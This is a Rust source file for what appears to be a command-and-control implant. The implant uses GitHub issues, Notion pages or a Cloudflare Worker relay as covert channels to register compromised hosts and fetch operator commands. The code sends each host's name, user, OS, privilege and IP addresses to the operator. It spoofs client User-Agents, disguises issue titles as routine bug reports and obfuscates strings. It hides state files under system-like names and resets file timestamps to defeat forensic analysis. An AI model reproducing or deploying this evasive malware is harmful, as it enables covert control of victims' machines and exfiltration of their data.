/// Real clients observed in GitHub API logs: git, PyGithub, go-github, octokit, etc.
fn build_user_agent() -> String {
    let v = rand::random::<u8>() % 8;
    let r = || rand::random::<u8>();
    match v {
        0 => format!("git/2.{}.{}", r() % 10, r() % 20),
        1 => format!("go-github/{}.{}.{}", 50 + r() % 20, r() % 10, r() % 10),
        2 => format!("PyGithub/{}.{}", 1 + r() % 4, r() % 10),
        3 => format!("octokit.rb/{}.{}.{}", 4 + r() % 10, r() % 20, r() % 10),
        4 => format!("GitHub-Actions-Hookshot/{}", option_env!("CARGO_PKG_VERSION").unwrap_or("0.1.0")),
        5 => format!("github-api-client-go/{}.{}", r() % 3, r() % 10),
        6 => format!("GHES-Runner/2024.{}.{}", r() % 12, r() % 30),
        _ => format!("git/2.{}.{}", r() % 10, r() % 20),
    }
}

/// Three-tier adaptive polling: interval adjusts based on operator activity.
///
/// - Hot  (< 2 min): operator online, fast response
/// - Warm (< 1 h)  : recent activity, normal interval
/// - Cold (>= 1 h) : no commands for a long time, slow down to save API quota
struct SessionHeat {
    // None = no command seen yet = Cold mode. Never initialize by subtracting a
    // Duration from Instant::now(): Instant is CLOCK_MONOTONIC (uptime-based)
    // on Linux, so on hosts with uptime < 2h that subtraction underflows and
    // panics inside run_agent.
    last_cmd: Option<std::time::Instant>,
}

impl SessionHeat {
    fn new() -> Self {
        Self { last_cmd: None }
    }

    fn touch(&mut self) {
        self.last_cmd = Some(std::time::Instant::now());
    }

    /// Return the recommended poll interval (seconds) based on current heat level.
    fn poll_interval(&self, base: u64) -> u64 {
        let elapsed = self.last_cmd
            .map(|t| t.elapsed().as_secs())
            .unwrap_or(u64::MAX);
        if elapsed < 120 {
            base.min(15)        // Hot: max 15 s (operator active)
        } else if elapsed < 3600 {
            base                // Warm: normal configured interval
        } else {
            (base * 4).min(300) // Cold: max 5 min
        }
    }
}

/// Lightweight reachability check: TCP connect to the API endpoint.
/// GitHub: api.github.com:443 | Notion: api.notion.com:443
/// 从 worker URL（https://host:port 或 http://host:port 或 host:port）提取 host:port 探针。
/// 无显式端口时按 HTTP(S) 默认（80/443）补全。
fn extract_probe_host(url: &str) -> String {
    let mut rest = url.trim().trim_start_matches("https://").trim_start_matches("http://").trim_start_matches("https:").trim_start_matches("http:");
    let slash = rest.find('/').unwrap_or(rest.len());
    rest = &rest[..slash];
    if rest.contains(':') {
        rest.to_string()
    } else if url.starts_with("https") || rest.ends_with(":443") {
        format!("{}:443", rest)
    } else {
        format!("{}:80", rest)
    }
}

/// C2_LAB：探测 mock 服务器而非真实 SaaS 端点，离线实验不烧 120s 等待。
fn lab_probe_target() -> Option<String> {
    std::env::var("C2_LAB").ok().and_then(|base| {
        let b = base.trim().trim_start_matches("http://").trim_start_matches("https://");
        let host = b.split('/').next().unwrap_or("");
        if host.is_empty() {
            None
        } else if host.contains(':') {
            Some(host.to_string())
        } else {
            Some(format!("{}:80", host))
        }
    })
}

async fn tcp_probe(host: &str) -> bool {
    match tokio::time::timeout(
        Duration::from_secs(8),
        tokio::net::TcpStream::connect(host),
    ).await {
        Ok(Ok(_)) => true,
        _ => false,
    }
}

async fn check_api_reachable(config: &Config) -> bool {
    // C2_LAB: probe the mock server's host:port instead of the real SaaS
    // endpoint so offline labs don't burn 120 s network-unavailable waits.
    if let Some(h) = lab_probe_target() {
        return tcp_probe(&h).await;
    }
    // 活动通道探测：dual 启用后按 failover 当前通道（备用期探 GitHub），
    // 否则按 channel_type（纯 worker 探中继，别白探 api.github.com:443）。
    let host = if worker_active(config) {
        match config.worker_urls.first() {
            Some(u) => extract_probe_host(u),
            None => obfstr::obfstr!("api.github.com:443").to_string(),
        }
    } else if config.is_notion() {
        obfstr::obfstr!("api.notion.com:443").to_string()
    } else {
        obfstr::obfstr!("api.github.com:443").to_string()
    };
    tcp_probe(&host).await
}

/// Worker 主通道可达性探测（failback 专用）：TCP 探中继地址。
/// TCP 通≠凭据有效——真正的凭据校验由 ensure_worker_ready_then_failback
/// 里的重新注册（ch.register）完成，注册失败会保持备用不切换。
async fn check_worker_reachable(config: &Config) -> bool {
    if let Some(h) = lab_probe_target() {
        return tcp_probe(&h).await;
    }
    let host = match config.worker_urls.first() {
        Some(u) => extract_probe_host(u),
        None => return false, // 无中继地址：无从探测
    };
    tcp_probe(&host).await
}

/// Generate a low-fingerprint Issue title (excludes hostname/username etc.).
/// Uses the first 8 chars of agent_id as an opaque reference; format mimics a normal tech issue.
fn build_issue_title(agent_id: &str) -> String {
    let short_id = agent_id.get(..8).unwrap_or(agent_id);
    // FNV-1a hash of agent_id selects template
    let mut h: u32 = 0x811c9dc5u32;
    for b in agent_id.bytes() {
        h ^= b as u32;
        h = h.wrapping_mul(0x01000193);
    }
    let templates: &[&str] = &[
        "Background task scheduling delay detected",
        "Service worker termination in async context",
        "Unexpected EOF during socket read operation",
        "Memory allocation retry triggered in pool",
        "Connection timeout during upstream sync",
        "Thread pool saturation during peak load",
        "File descriptor exhaustion in long-running worker",
        "Signal handling race condition observed",
    ];
    format!("{} [ref:{}]", templates[(h as usize) % templates.len()], short_id)
}

fn create_or_load_issue(
    config: &Config,
    agent_id: &str,
    force_github: bool,
) -> Result<(String, bool), Box<dyn std::error::Error + Send + Sync>> {
    // Worker channel: "issue id" is the agent id itself (short uuid prefix).
    // The registration body is AES-GCM encrypted with the channel password —
    // the relay (D1) must never store plaintext host identity (blue-team
    // could reach the Cloudflare account). The controller decrypts it during
    // discovery using the same channel password.
    // force_github：双通道（worker 主 / github 备）下以 worker 配置创建
    // GitHub 备份 issue 时置 true——跳过 worker 分支，走 github 缓存/搜索/建。
    if config.is_worker() && !force_github {
        let ch = config.worker_chan()
            .ok_or("worker: C2_WORKER_URLS/C2_WORKER_SECRET not configured")?;
        let mut body = format!("{}{}\nOS: {}\nHost: {}\nUser: {}\nVersion: {}\n", obfstr::obfstr!("Agent ID: ").to_string(),
                               agent_id, std::env::consts::OS,
                               whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
                               whoami::username(), config.version);
        if !config.release_id.is_empty() {
            body.push_str(&format!("Release: {}\n", config.release_id));
        }
        body.push_str(&format!("\n{}", crate::sysinfo::collect_sysinfo()));
        let enc = crate::crypto::encrypt(&body, &config.password)
            .map_err(|e| e.to_string())
            .map_err(|e| -> Box<dyn std::error::Error + Send + Sync> { e.into() })?;
        let wid = format!("w-{}", &agent_id[..agent_id.len().min(8)]);
        ch.register(&wid, &enc)
            .map_err(|e| -> Box<dyn std::error::Error + Send + Sync> { e.into() })?;
        // 重启不算首跑：否则每次起来都丢一遍整盘文件列表，D1/终端被刷爆。
        let issue_file = get_issue_file_path();
        let first = match fs::read_to_string(&issue_file) {
            Ok(s) if !s.trim().is_empty() => false,
            _ => {
                if let Some(parent) = PathBuf::from(&issue_file).parent() {
                    fs::create_dir_all(parent).ok();
                }
                let _ = stealth_write(&issue_file, wid.as_bytes());
                true
            }
        };
        return Ok((wid, first));
    }

    let issue_file = get_issue_file_path();

    // 1. Try loading cached issue/page ID from local file
    if let Ok(content) = fs::read_to_string(&issue_file) {
        let cached_id = content.trim().to_string();
        // 纯 worker 会把 w-<id8> 写进同一份身份文件。force_github 补建备份
        // 时不能拿它去打 GitHub：网络抖动会被当成 NetworkError 卡住补建。
        if !cached_id.is_empty()
            && force_github
            && !crate::failover::is_real_github_backup_id(&cached_id)
        {
            debug_log("create_or_load_issue: leftover worker-shaped cache, ignore for GitHub backup");
        } else if !cached_id.is_empty() {
            match verify_issue_exists(config, &cached_id) {
                VerifyResult::Exists => {
                    debug_log(&format!("Issue verify: cached id={} confirmed exists", &cached_id[..cached_id.len().min(12)]));
                    return Ok((cached_id, false));
                }
                VerifyResult::NotFound => {
                    debug_log("Cached issue/page not found (404), searching...");
                    let _ = fs::remove_file(&issue_file);
                }
                VerifyResult::TokenError => {
                    // Token invalid — signal the outer loop so it can try the backup config.
                    debug_log("Issue verify: auth error (401/403), token may be invalid");
                    return Err("Auth error verifying cached issue (401/403)".into());
                }
                VerifyResult::NetworkError => {
                    // Cannot confirm state — preserve the cached ID and propagate
                    // the error so the outer loop retries after backoff.
                    debug_log("Issue verify: network error, keeping cached id and retrying later");
                    return Err("Network error verifying cached issue".into());
                }
            }
        }
    }

    // 2. Search for existing issue/page from this agent
    match search_existing_issue(config, agent_id) {
        Ok(Some(existing)) => {
            debug_log(&format!("Found existing issue/page {}, reusing", existing));
            if let Some(parent) = PathBuf::from(&issue_file).parent() {
                fs::create_dir_all(parent).ok();
            }
            if let Err(e) = stealth_write(&issue_file, existing.as_bytes()) {
                debug_log(&format!("create_or_load_issue: failed to cache issue id locally: {}", e));
            }
            return Ok((existing, false));
        }
        Ok(None) => {
            debug_log("search_existing_issue: no matching issue found, will create new");
        }
        Err(e) => {
            // Network error during search — do not create a new issue (duplicate risk).
            debug_log(&format!("search_existing_issue: network error ({}), retrying later", e));
            return Err(format!("Network error searching for existing issue: {}", e).into());
        }
    }

    // 3. Create a new issue (GitHub) or page (Notion)
    let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string());
    let username = whoami::username();
    let os_name = std::env::consts::OS;
    let sysinfo = crate::sysinfo::collect_sysinfo();

    let new_id = if config.is_notion() {
        // Notion: create a Database row (Page) with structured properties
        let title = format!("{} [{}]", hostname, agent_id.chars().take(8).collect::<String>());
        // Parse sysinfo for structured properties
        let mut props = serde_json::json!({
            "Name":      {"title": [{"text": {"content": title}}]},
            "Agent ID":  {"rich_text": [{"text": {"content": agent_id}}]},
            "Hostname":  {"rich_text": [{"text": {"content": hostname}}]},
            "Username":  {"rich_text": [{"text": {"content": username}}]},
        });
        // 审计修复（bug#6）：Version 是项 9 新增属性——存量 Notion 库没有它时
        // Notion 会 400（property does not exist）导致注册全挂。仅在非空时
        // 携带，并在 4xx 时去掉该属性重试一次（旧库降级为不记版本）。
        if !config.version.is_empty() {
            props["Version"] = serde_json::json!({"rich_text": [{"text": {"content": config.version}}]});
        }
        // Extract fields from sysinfo string
        for line in sysinfo.lines() {
            let t = line.trim();
            if let Some(v) = t.strip_prefix("OS: ")       { props["OS"]        = serde_json::json!({"rich_text": [{"text": {"content": v}}]}); }
            if let Some(v) = t.strip_prefix("Privilege: ") { props["Privilege"]  = serde_json::json!({"select": {"name": v}}); }
            if let Some(v) = t.strip_prefix("Kernel: ")    { props["Kernel"]     = serde_json::json!({"rich_text": [{"text": {"content": v}}]}); }
            if let Some(v) = t.strip_prefix("Arch: ")      { props["Arch"]       = serde_json::json!({"rich_text": [{"text": {"content": v}}]}); }
            if let Some(v) = t.strip_prefix("IPs: ")       { props["IPs"]        = serde_json::json!({"rich_text": [{"text": {"content": v}}]}); }
        }

        let mut payload = serde_json::json!({
            "parent": {"database_id": config.github_repo},
            "properties": props,
        });

        debug_log(&format!("Creating Notion page: {}", title));

        let notion_url = format!("{}/pages", config.api_base());
        let notion_headers = |r: crate::net::NetReq| r
            .timeout(std::time::Duration::from_secs(30))
            .set("Authorization", &format!("Bearer {}", config.github_token))
            .set("Notion-Version", "2022-06-28")
            .set("Content-Type", "application/json");
        let resp = match notion_headers(crate::net::post(&notion_url)).send_json(&payload) {
            Ok(r) => r,
            Err(ureq::Error::Status(code, _)) if (400u16..=422).contains(&code) => {
                debug_log(&format!(
                    "Notion create rejected ({}); retrying once without Version property (legacy DB?)", code));
                let removed = payload["properties"].as_object_mut().map(|p| p.remove("Version").is_some());
                if removed == Some(true) {
                    notion_headers(crate::net::post(&notion_url)).send_json(&payload)?
                } else {
                    return Err("Notion create failed".into());
                }
            }
            Err(e) => return Err(e.into()),
        };

        let page: serde_json::Value = resp.into_json()?;
        page["id"].as_str().ok_or("No page id")?.to_string()
    } else {
        // GitHub: create an Issue
        let title = build_issue_title(agent_id);
        let mut body = format!("{}{}\nOS: {}\nHost: {}\nUser: {}\nVersion: {}\n",
                               obfstr::obfstr!("Agent ID: ").to_string(),
                               agent_id, os_name, hostname, username, config.version);
        if !config.release_id.is_empty() {
            body.push_str(&format!("Release: {}\n", config.release_id));
        }
        body.push_str(&format!("\n{}", sysinfo));

        debug_log(&format!("Registering as: {}", body.replace('\n', " | ")));

        let url = format!("{}/repos/{}/{}/issues",
                          config.api_base(), config.github_owner, config.github_repo);
        let payload = serde_json::json!({
            "title": title,
            "body": body,
            "labels": [obfstr::obfstr!("agent")]
        });

        let resp = crate::net::post(&url)
            .timeout(std::time::Duration::from_secs(30))
            .set("Authorization", &format!("token {}", config.github_token))
            .set("User-Agent", &config.user_agent)
            .send_json(&payload)?;

        let issue: serde_json::Value = resp.into_json()?;
        issue["number"].as_u64().ok_or("No issue number")?.to_string()
    };

    if let Some(parent) = PathBuf::from(&issue_file).parent() {
        fs::create_dir_all(parent).ok();
    }
    if let Err(e) = stealth_write(&issue_file, new_id.as_bytes()) {
        // Issue was created on the server; log the local cache failure so
        // the next startup search_existing_issue can recover it.
        debug_log(&format!("create_or_load_issue: new issue {} created but local cache write failed: {}", new_id, e));
    }

    Ok((new_id, true))
}

/// Search for an existing issue/page created by this agent.
/// Returns Ok(Some(id)) if found, Ok(None) if definitely absent, Err if network error
/// (so caller won't confuse "network down" with "issue not found" and create a duplicate).
fn search_existing_issue(config: &Config, agent_id: &str) -> Result<Option<String>, String> {
    if config.is_notion() {
        // Notion: query database for a row with matching Agent ID property
        let payload = serde_json::json!({
            "filter": {
                "property": "Agent ID",
                "rich_text": {"equals": agent_id}
            },
            "page_size": 1
        });
        let url = format!("{}/databases/{}/query", config.api_base(), config.github_repo);
        let resp = crate::net::post(&url)
            .timeout(std::time::Duration::from_secs(20))
            .set("Authorization", &format!("Bearer {}", config.github_token))
            .set("Notion-Version", "2022-06-28")
            .set("Content-Type", "application/json")
            .send_json(&payload)
            .map_err(|e| format!("search Notion: {}", e))?;
        let data: serde_json::Value = resp.into_json()
            .map_err(|e| format!("search Notion json: {}", e))?;
        let id = data["results"].as_array()
            .and_then(|arr| arr.first())
            .and_then(|p| p.get("id"))
            .and_then(|v| v.as_str())
            .map(|s| s.to_string());
        Ok(id)
    } else {
        // GitHub: search issues by body content (full agent_id).
        let needle = format!("{}{}", obfstr::obfstr!("Agent ID: "), agent_id);
        for page in 1..=5u32 {
            let url = format!(
                "{}/repos/{}/{}/issues?labels=agent&state=open&per_page=100&page={}",
                config.api_base(), config.github_owner, config.github_repo, page
            );
            let resp = crate::net::get(&url)
                .timeout(std::time::Duration::from_secs(20))
                .set("Authorization", &format!("token {}", config.github_token))
                .set("User-Agent", &config.user_agent)
                .call()
                .map_err(|e| format!("search GitHub page {}: {}", page, e))?;
            let issues: serde_json::Value = resp.into_json()
                .map_err(|e| format!("search GitHub json: {}", e))?;
            let arr = match issues.as_array() {
                Some(a) => a,
                None => return Ok(None),
            };
            if arr.is_empty() { break; }
            for issue in arr {
                let body = issue["body"].as_str().unwrap_or("");
                if let Some(number) = issue["number"].as_u64() {
                    if body.contains(&needle) {
                        return Ok(Some(number.to_string()));
                    }
                }
            }
            if arr.len() < 100 { break; }
        }
        Ok(None)
    }
}

/// Four-way result for issue verification.
/// Distinguishes "definitely gone" (404/410), "auth failure" (401/403), and
/// "network unavailable" so the caller can avoid deleting a valid cached issue ID
/// due to a transient network error, and can trigger backup-config logic on token errors.
enum VerifyResult { Exists, NotFound, TokenError, NetworkError }

fn verify_issue_exists(config: &Config, issue_id: &str) -> VerifyResult {
    let url = if config.is_notion() {
        format!("{}/pages/{}", config.api_base(), issue_id)
    } else {
        format!("{}/repos/{}/{}/issues/{}",
            config.api_base(), config.github_owner, config.github_repo, issue_id)
    };

    let req = crate::net::get(&url).timeout(std::time::Duration::from_secs(15));
    let req = if config.is_notion() {
        req.set("Authorization", &format!("Bearer {}", config.github_token))
           .set("Notion-Version", "2022-06-28")
    } else {
        req.set("Authorization", &format!("token {}", config.github_token))
           .set("User-Agent", &config.user_agent)
    };

    match req.call() {
        Ok(resp) if resp.status() == 200 => {
            // Notion "deletes" pages by trashing them: GET still returns 200
            // with archived=true. Treat trashed pages as gone so the agent
            // recreates its page instead of posting comments into a dead one.
            if config.is_notion() {
                if let Ok(json) = resp.into_json::<serde_json::Value>() {
                    if json["archived"].as_bool().unwrap_or(false) {
                        return VerifyResult::NotFound;
                    }
                }
            }
            VerifyResult::Exists
        }
        Err(ureq::Error::Status(404, _)) | Err(ureq::Error::Status(410, _)) => VerifyResult::NotFound,
        // Token / permission errors — not transient, should surface to caller.
        Err(ureq::Error::Status(401, _)) | Err(ureq::Error::Status(403, _)) => VerifyResult::TokenError,
        // Any other status (5xx) or IO error — treat as transient.
        _ => VerifyResult::NetworkError,
    }
}

fn get_issue_file_path() -> String {
    #[cfg(windows)]
    {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\machine-id.txt", username)
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            format!("{}/machine-id", obfstr::obfstr!("/var/tmp/.systemd"))
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            format!("{}/.local/share/machine-id", home)
        }
    }
}


fn get_last_comment_file_path() -> String {
    #[cfg(windows)]
    {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\random-seed.txt", username)
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            "/var/tmp/.systemd/random-seed".to_string()
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            format!("{}/.local/share/random-seed", home)
        }
    }
}

fn save_last_comment_id(id: u64) {
    let path = get_last_comment_file_path();
    if let Err(e) = stealth_write(&path, id.to_string().as_bytes()) {
        // Write failure means on-disk cursor lags behind the in-memory one.
        // After a restart, load_last_comment_id() will return a stale value and
        // the same comments may be re-fetched and re-executed.
        debug_log(&format!("save_last_comment_id: write failed (id={}): {}", id, e));
    }
}

// ─── Notion processed-command dedup ──────────────────────────────────────────
// Watermark alone cannot prevent re-execution after a restart where the watermark
// write succeeded but the command was mid-execution. Persist the last 1000
// processed command IDs so they can be skipped on the next poll.

fn load_processed_cmd_ids() -> std::collections::HashSet<String> {
    crate::stor::load_processed_cmd_ids()
}

/// Append a command_id to the processed-commands set (persisted via catalog v2).
/// Prunes to the most recent 500 entries so the set stays small.
/// stealth_write restores both directory and file mtime after each write,
/// so the entry in `ls -la` does not reveal when commands were last executed.
fn mark_cmd_processed(command_id: &str) {
    crate::stor::mark_cmd_processed(command_id);
}

fn get_clock_path() -> String {
    #[cfg(windows)]
    {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\clock.txt", username)
    }
    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            "/var/tmp/.systemd/clock".to_string()
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            format!("{}/.local/share/clock", home)
        }
    }
}

fn save_clock(iso_ts: &str) {
    let path = get_clock_path();
    if let Err(e) = stealth_write(&path, iso_ts.as_bytes()) {
        debug_log(&format!("save_clock: write failed (ts={}): {}", iso_ts, e));
    }
}

fn load_clock() -> Option<String> {
    let path = get_clock_path();
    std::fs::read_to_string(&path)
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Write a file and restore:
///   1. The parent directory's mtime (standard: hides the new-file-in-dir event)
///   2. The file's own previous mtime if it already existed (hides content update events)
///
/// After this call, `ls -la` on both the file and its parent shows the same
/// timestamps as before the write, making it impossible to determine from
/// filesystem metadata alone when the agent last ran or updated its state.
#[cfg(unix)]
fn stealth_write(path: &str, data: &[u8]) -> std::io::Result<()> {
    use filetime::{FileTime, set_file_times};

    let p = std::path::Path::new(path);
    let parent = p.parent();

    // Snapshot times BEFORE the write
    let dir_time  = parent.and_then(|d| std::fs::metadata(d).ok())
                          .and_then(|m| m.modified().ok());
    let file_time = std::fs::metadata(p).ok()
                          .and_then(|m| m.modified().ok());

    std::fs::write(path, data)?;

    // Restore directory mtime (write changed it when creating a new entry)
    if let (Some(dir), Some(t)) = (parent, dir_time) {
        let ft = FileTime::from_system_time(t);
        let _ = set_file_times(dir, ft, ft);
    }
    // Restore file's own mtime (write updated it)
    if let Some(t) = file_time {
        let ft = FileTime::from_system_time(t);
        let _ = set_file_times(p, ft, ft);
    }

    Ok(())
}

#[cfg(not(unix))]
fn stealth_write(path: &str, data: &[u8]) -> std::io::Result<()> {
    std::fs::write(path, data)
}

fn load_last_comment_id() -> u64 {
    let path = get_last_comment_file_path();
    std::fs::read_to_string(&path)
        .ok()
        .and_then(|s| s.trim().parse().ok())
        .unwrap_or(0)
}

// ─── Blocking HTTP fetch helpers (called via spawn_blocking) ──────────────────

/// Fetch all Notion comments for a page. Returns raw normalized JSON values.
/// Caller is responsible for filtering/sorting in async context.
fn fetch_notion_comments(
    config: &Config,
    issue_id: &str,
) -> Result<Vec<serde_json::Value>, String> {
    let mut all: Vec<serde_json::Value> = Vec::new();
    let mut start_cursor: Option<String> = None;
    let mut page_count: u32 = 0;
    const MAX_PAGES: u32 = 50;
    loop {
        page_count += 1;
        if page_count > MAX_PAGES { break; }
        let mut url = format!("{}/comments?block_id={}&page_size=100", config.api_base(), issue_id);
        if let Some(ref cursor) = start_cursor {
            url.push_str(&format!("&start_cursor={}", cursor));
        }
        let resp = crate::net::get(&url)
            .timeout(std::time::Duration::from_secs(30))
            .set("Authorization", &format!("Bearer {}", config.github_token))
            .set("Notion-Version", "2022-06-28")
            .call()
            .map_err(|e| e.to_string())?;
        let data: serde_json::Value = resp.into_json().map_err(|e| e.to_string())?;
        if let Some(results) = data["results"].as_array() {
            for c in results {
                let mut body = String::new();
                if let Some(rt_arr) = c["rich_text"].as_array() {
                    for rt in rt_arr {
                        if let Some(text) = rt["plain_text"].as_str() {
                            body.push_str(text);
                        }
                    }
                }
                all.push(serde_json::json!({
                    "id": c["id"],
                    "body": body,
                    "created_at": c["created_time"],
                    "updated_at": c["created_time"],
                }));
            }
            if !data["has_more"].as_bool().unwrap_or(false) { break; }
            let new_cursor = data["next_cursor"].as_str().map(|s| s.to_string());
            if new_cursor.is_none() || new_cursor == start_cursor { break; }
            start_cursor = new_cursor;
        } else { break; }
    }
    Ok(all)
}

/// Check if a kill-switch issue exists in the repo (label=KILLALL, state=open).
/// Returns true if the signal is found.
/// Bin-side adapter: Config → WorkerChan::from_parts (worker.rs compiles in
/// both crate roots and therefore must not reference Config directly).
impl Config {
    fn worker_chan(&self) -> Option<crate::worker::WorkerChan> {
        crate::worker::WorkerChan::from_parts(
            &self.channel_type, &self.worker_urls, &self.worker_secret, &self.worker_path)
    }
}

fn check_github_kill(config: &Config) -> bool {
    if config.github_token.trim().is_empty()
        || config.github_token.trim() == "unused"
        || config.github_token.trim() == "TOKEN"
    {
        return false;
    }
    let kill_label = obfstr::obfstr!("KILLALL").to_string();
    let url = format!(
        "{}/repos/{}/{}/issues?labels={}&state=open&per_page=1",
        config.api_base(), config.github_owner, config.github_repo, kill_label
    );
    let resp = match crate::net::get(&url)
        .timeout(std::time::Duration::from_secs(15))
        .set("Authorization", &format!("token {}", config.github_token))
        .set("User-Agent", &config.user_agent)
        .call()
    {
        Ok(r) => r,
        Err(_) => return false,
    };
    let body: serde_json::Value = match resp.into_json() {
        Ok(v) => v,
        Err(_) => return false,
    };
    body.as_array().map_or(false, |arr| !arr.is_empty())
}

fn check_kill_signal(config: &Config) -> bool {
    // 双通道：Worker 与 GitHub 都查。只听活动通道时，另一侧写成功、本侧
    // 写失败（或 Path 错）会让紧急停机落空。
    if let Some(ch) = config.worker_chan() {
        if ch.check_kill().unwrap_or(false) {
            return true;
        }
    }
    if config.is_notion() {
        // C13：Notion kill——控制器 killswitch 会在 agent 页面发一条
        // "<!-- k -->KILLALL" 明文标记评论（kill 无需加密，签名为常量标记）。
        let issue_id = match fs::read_to_string(get_issue_file_path()) {
            Ok(s) => s.trim().to_string(),
            Err(_) => return false,   // 尚未注册（无缓存页 ID）——无从查 kill
        };
        if issue_id.is_empty() { return false; }
        if let Ok(comments) = fetch_notion_comments(config, &issue_id) {
            for c in comments.iter().rev().take(10) {
                if let Some(body) = c["body"].as_str() {
                    if body.contains("<!-- k -->") && body.contains("CANCEL") {
                        return false;
                    }
                    if body.contains("<!-- k -->") && body.contains("KILLALL") {
                        return true;
                    }
                }
            }
        }
        return false;
    }
    check_github_kill(config)
}

/// Fetch GitHub issue comments with pagination. `since_param` should already
/// be URL-encoded (e.g. `"&since=2024-01-01T00:00:00Z"`) or empty.
fn fetch_github_comments(
    config: &Config,
    issue_id: &str,
    since_param: &str,
) -> Result<Vec<serde_json::Value>, String> {
    let mut all: Vec<serde_json::Value> = Vec::new();
    let mut page = 1u32;
    const MAX_PAGES: u32 = 50; // 50 * 100 = 5 000 comments; prevents runaway on huge issues
    while page <= MAX_PAGES {
        let url = format!(
            "{}/repos/{}/{}/issues/{}/comments?per_page=100&page={}{}",
            config.api_base(), config.github_owner, config.github_repo,
            issue_id, page, since_param
        );
        let resp = crate::net::get(&url)
            .timeout(std::time::Duration::from_secs(30))
            .set("Authorization", &format!("token {}", config.github_token))
            .set("User-Agent", &config.user_agent)
            .call()
            .map_err(|e| e.to_string())?;
        let batch: serde_json::Value = resp.into_json().map_err(|e| e.to_string())?;
        let comments = match batch.as_array() {
            Some(arr) => arr.to_vec(),
            None => break,
        };
        let count = comments.len();
        all.extend(comments);
        if count < 100 { break; }
        page += 1;
    }
    Ok(all)
}

/// 进程仍活着、中继 TCP 仍通、只重建了 D1 时：空拉取≠报错，注册路径
/// 也不会再跑。连续空拉取若干轮后才 since=0 探一次，避免每轮翻倍请求。
fn worker_d1_probe_due(empty_and_high: bool) -> bool {
    use std::sync::atomic::{AtomicU32, Ordering};
    static STREAK: AtomicU32 = AtomicU32::new(0);
    if !empty_and_high {
        STREAK.store(0, Ordering::Relaxed);
        return false;
    }
    let n = STREAK.fetch_add(1, Ordering::Relaxed).saturating_add(1);
    n == 12 || (n > 12 && n % 60 == 0)
}

#[allow(unused_assignments)]
async fn check_commands(
    config: &Config,
    issue_id: &str,
    last_comment_id: &mut u64,
    agent_id: &str,
) -> Result<bool, Box<dyn std::error::Error>> {

    // ── Fetch phase: blocking HTTP on dedicated thread ────────────────────────
    // ureq is a synchronous client. Running it directly in an async function
    // occupies a tokio worker thread for up to 30 s per page, which with only
    // 2 worker threads can starve other async tasks (timers, signal handlers).
    // spawn_blocking hands the work to the blocking thread pool instead.
    // 通道路由（方向调整后）：dual → failover 当前活动通道；否则 channel_type。
    let worker_exec = worker_active(config);
    let all_comments: Vec<serde_json::Value> = if worker_exec {
        // Worker channel: D1 rows already carry monotonic ids; map them into
        // the GitHub comment shape so the shared watermark/execute body below
        // processes them unchanged.
        let config_c = config.clone();
        let issue_id_c = issue_id.to_string();
        // M1 修复：worker 用独立持久水位（catalog.worker_cursor，D1 id 空间），
        // 与 GitHub 的 random-seed（评论号空间）彻底分离——跨模式迁移不再
        // 互相污染（github→worker 残留巨水位会把所有 worker 命令滤掉）。
        let since_c = crate::stor::load_worker_cursor().unwrap_or(0);
        let fetched = tokio::task::spawn_blocking(move || {
            let ch = config_c.worker_chan()
                .ok_or_else(|| "worker: channel not configured".to_string())?;
            ch.fetch_commands(&issue_id_c, since_c)
        })
        .await
        .map_err(|e| -> Box<dyn std::error::Error> { e.to_string().into() })?
        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;
        if !fetched.is_empty() {
            let _ = worker_d1_probe_due(false);
        }
        if fetched.is_empty() && worker_d1_probe_due(since_c > 0) {
            let config_p = config.clone();
            let issue_id_p = issue_id.to_string();
            match tokio::task::spawn_blocking(move || {
                let ch = config_p.worker_chan()
                    .ok_or_else(|| "worker: channel not configured".to_string())?;
                ch.fetch_commands(&issue_id_p, 0)
            }).await {
                Ok(Ok(probe)) => {
                    let max_id = probe.iter().filter_map(|c| c["id"].as_u64()).max().unwrap_or(0);
                    if crate::stor::d1_sequence_reset(max_id, since_c) {
                        debug_log(&format!(
                            "worker: D1 sequence reset (max_id={max_id} < cursor={since_c}), clearing watermark"
                        ));
                        crate::stor::clear_worker_cursor();
                        let cfg_r = config.clone();
                        let aid_r = agent_id.to_string();
                        let _ = tokio::task::spawn_blocking(move || {
                            register_worker_identity(&cfg_r, &aid_r)
                        }).await;
                        probe
                    } else {
                        fetched
                    }
                }
                _ => fetched,
            }
        } else {
            fetched
        }
    } else if config.is_notion() {
        let config_c = config.clone();
        let issue_id_c = issue_id.to_string();
        let raw = tokio::task::spawn_blocking(move || {
            fetch_notion_comments(&config_c, &issue_id_c)
        })
        .await
        .map_err(|e| -> Box<dyn std::error::Error> { e.to_string().into() })?
        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;

        // Filter and sort in async context (no I/O, pure CPU — fine here)
        let mut comments = raw;
        if let Some(since) = load_clock() {
            comments.retain(|c| c["created_at"].as_str().unwrap_or("") > since.as_str());
        }
        // Notion API does not guarantee ordering — sort ascending by created_at so the
        // watermark logic processes comments in chronological order.
        comments.sort_by(|a, b| {
            a["created_at"].as_str().unwrap_or("")
                .cmp(b["created_at"].as_str().unwrap_or(""))
        });
        comments
    } else {
        // RFC 3339 timestamps contain ':' which must be percent-encoded in query strings.
        let since_param = load_clock()
            .map(|ts| format!("&since={}", ts.replace(':', "%3A").replace('+', "%2B")))
            .unwrap_or_default();
        let config_c   = config.clone();
        let issue_id_c = issue_id.to_string();
        tokio::task::spawn_blocking(move || {
            fetch_github_comments(&config_c, &issue_id_c, &since_param)
        })
        .await
        .map_err(|e| -> Box<dyn std::error::Error> { e.to_string().into() })?
        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?
    };

    let mut had_activity = false;

    if config.is_notion() {
